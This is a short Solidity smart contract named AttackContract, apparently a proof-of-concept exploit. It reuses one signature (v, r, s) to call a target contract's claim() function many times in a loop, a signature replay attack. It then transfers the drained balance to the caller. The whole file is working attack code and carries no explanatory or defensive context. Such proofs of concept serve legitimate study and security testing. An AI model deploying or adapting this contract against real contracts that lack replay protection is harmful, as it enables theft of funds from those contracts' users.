// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReplayTarget {
    function claim(address payable to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external;
}

contract AttackContract {
    IReplayTarget public target;

    constructor(address _target) {
        target = IReplayTarget(_target);
    }

    function attack(uint256 times, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
        for (uint256 i = 0; i < times; i++) {
            target.claim(payable(address(this)), amount, v, r, s);
        }
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
